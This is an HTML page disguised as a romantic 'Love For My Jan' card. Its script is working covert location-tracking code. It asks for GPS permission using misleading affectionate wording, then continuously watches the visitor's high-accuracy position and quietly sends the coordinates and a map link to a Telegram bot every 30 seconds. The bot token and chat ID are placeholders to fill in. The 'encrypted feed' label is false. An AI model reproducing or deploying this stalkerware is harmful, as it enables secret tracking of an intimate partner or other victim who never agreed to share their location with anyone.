<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Love For My Jan üõ∞Ô∏è</title>

  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Quicksand:wght@400;600&display=swap" rel="stylesheet">

  <style>
    :root {
      --neon-green: #00ff9c;
      --neon-pink: #ff69b4;
      --bg-dark: #0a0a0a;
    }

    body {
      margin: 0;
      height: 100vh;
      background: radial-gradient(circle at top, #0f2027, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      color: var(--neon-green);
      font-family: 'Quicksand', sans-serif;
      overflow: hidden;
    }

    .card {
      background: rgba(0, 0, 0, 0.85);
      border: 1px solid var(--neon-green);
      border-radius: 24px;
      padding: 35px;
      width: 90%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 0 30px rgba(0, 255, 156, 0.15);
      position: relative;
    }

    h2 { font-family: 'Orbitron', sans-serif; letter-spacing: 2px; margin-bottom: 20px; }
    h2 span { color: var(--neon-pink); }

    #status-indicator {
      display: inline-block;
      width: 10px; height: 10px;
      background: #555;
      border-radius: 50%;
      margin-right: 8px;
    }
    .active-dot { background: var(--neon-green) !important; box-shadow: 0 0 10px var(--neon-green); }

    .display-area {
      background: rgba(255, 255, 255, 0.03);
      padding: 20px;
      border-radius: 15px;
      margin: 20px 0;
      border: 1px solid rgba(0, 255, 156, 0.1);
    }

    #coords { font-family: 'Orbitron', monospace; font-size: 0.9rem; color: #fff; }

    .btn {
      display: inline-block;
      padding: 15px 30px;
      border-radius: 12px;
      text-decoration: none;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s;
      border: none;
      background: linear-gradient(135deg, var(--neon-green), var(--neon-pink));
      color: #000;
      font-size: 1rem;
    }

    .btn:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255, 105, 180, 0.4); }

    #modalOverlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.9);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    .modal-content {
      background: #111;
      border: 2px solid var(--neon-pink);
      padding: 40px;
      border-radius: 25px;
      text-align: center;
      max-width: 320px;
      box-shadow: 0 0 40px rgba(255, 105, 180, 0.3);
    }

    .modal-content h3 { font-family: 'Orbitron'; color: #fff; }
    .modal-content p { color: #ccc; font-size: 0.9rem; line-height: 1.5; margin-bottom: 25px; }
  </style>
</head>
<body>

  <div id="modalOverlay">
    <div class="modal-content">
      <h3>ENABLE GPS</h3>
      <p>This application requires permission to see your live movement on my heart.</p>
      <button class="btn" onclick="startLiveTracking()">ALLOW & SEE</button>
    </div>
  </div>

  <div class="card">
    <h2>LIVE <span>CHECK</span></h2>
    <div style="font-size: 0.8rem; font-weight: bold; margin-bottom: 10px;">
      <span id="status-indicator"></span><span id="status-text">SYSTEM STANDBY</span>
    </div>

    <div class="display-area">
      <div id="coords">LAT: --.---- | LON: --.----</div>
      <div id="accuracy" style="font-size: 0.7rem; margin-top: 10px; opacity: 0.6;">Accuracy: --m</div>
    </div>

    <a id="mapBtn" class="btn" target="_blank" style="display: none;">OPEN LIVE MAP</a>
    
    <div style="margin-top: 25px; font-size: 0.7rem; opacity: 0.4;">
      REAL-TIME ENCRYPTED FEED
    </div>
  </div>

  <script>
    const modal = document.getElementById('modalOverlay');
    const statusText = document.getElementById('status-text');
    const statusDot = document.getElementById('status-indicator');
    const coordsDiv = document.getElementById('coords');
    const accuracyDiv = document.getElementById('accuracy');
    const mapBtn = document.getElementById('mapBtn');

    // ===== Telegram Config =====
    const BOT_TOKEN = "YOUR_BOT_TOKEN";   // <-- Replace with your Token
    const CHAT_ID = "YOUR_CHAT_ID";       // <-- Replace with your ID
    let lastSentTime = 0;                 // For Throttling

    async function init() {
      if (!("geolocation" in navigator)) {
        statusText.innerText = "GPS NOT SUPPORTED";
        return;
      }

      if (navigator.permissions) {
        const result = await navigator.permissions.query({ name: 'geolocation' });
        if (result.state === 'granted') {
          startLiveTracking();
        } else {
          modal.style.display = 'flex';
        }
        result.onchange = () => {
          if (result.state === 'granted') {
            modal.style.display = 'none';
            startLiveTracking();
          }
        };
      } else {
        modal.style.display = 'flex';
      }
    }

    function startLiveTracking() {
      modal.style.display = 'none';
      statusText.innerText = "REQUESTING ACCESS...";

      navigator.geolocation.watchPosition(
        (position) => {
          const lat = position.coords.latitude.toFixed(6);
          const lon = position.coords.longitude.toFixed(6);
          const acc = Math.round(position.coords.accuracy);

          // Update UI
          statusText.innerText = "LIVE TRACING ACTIVE";
          statusDot.classList.add('active-dot');
          coordsDiv.innerText = `LAT: ${lat} | LON: ${lon}`;
          accuracyDiv.innerText = `Accuracy: ${acc} meters`;

          // Fixed the Syntax Error here: added $ before {lat}
          mapBtn.href = `https://www.google.com/maps?q=${lat},${lon}`;
          mapBtn.style.display = 'inline-block';

          // Send to Telegram every 30 seconds to avoid spamming
          const now = Date.now();
          if (now - lastSentTime > 30000) { 
            sendTextToTelegram(`üõ∞Ô∏è My Jan's Location:\nLAT: ${lat}\nLON: ${lon}\nAccuracy: ${acc}m\nMap: https://www.google.com/maps?q=${lat},${lon}`);
            lastSentTime = now;
          }
        },
        (error) => {
          statusText.innerText = "PERMISSION DENIED";
          statusDot.classList.remove('active-dot');
          if(error.code === 1) modal.style.display = 'flex'; 
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
      );
    }

    function sendTextToTelegram(text) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
        .then(res => res.json())
        .catch(err => console.error("Telegram Error:", err));
    }

    window.onload = init;
  </script>
</body>
</html>
